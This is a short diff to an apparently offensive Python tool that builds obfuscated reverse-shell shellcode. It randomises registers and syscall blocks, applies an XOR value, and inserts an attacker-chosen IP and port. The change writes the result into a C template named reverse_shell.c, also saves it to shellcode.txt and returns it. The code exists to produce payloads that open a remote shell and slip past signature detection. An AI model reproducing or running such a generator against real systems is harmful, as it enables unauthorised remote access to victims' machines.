@@ -119,7 +119,7 @@ def oprand(preshellcode_reg1_reg2: dict, xor_nb: int) -> str:
     baseshell_modified = '0f05'.join(blocs) + '0f05'
     return baseshell_modified
 
-def shellcode(baseshell: str, ipbloc: str, portbloc: str, xor_nb: int):
+def shellcode(baseshell: str, ipbloc: str, portbloc: str, xor_nb: int) -> str:
     """
     Function that create the shellcode.
     This function call regreplace() and oprand() to do it.
@@ -148,12 +148,17 @@ def shellcode(baseshell: str, ipbloc: str, portbloc: str, xor_nb: int):
     # create the shellcode string
     shellcode = '\\x' + '\\x'.join(random_baseshell[i:i + 2] for i in range(0, len(random_baseshell), 2))
     
-    # save the shellcode in reverse_shell.c that can be compiled after
+
+    # save the shellcode in reverse_shell.c and shellcode.txt so that it can be compiled after of use in another purpose
     outfile = 'reverse_shell.c'
     ccode = open(c_template, 'r').read()
     ccode = ccode.replace('0', repr(shellcode).replace("'", '"'))
     with open(outfile, 'w') as out:
         out.write(ccode.replace(r'\\', '\\'))
+    with open('shellcode.txt', 'w') as outshellcode:
+        outshellcode.write(shellcode)
+
+    return shellcode
     
 
 def compile():
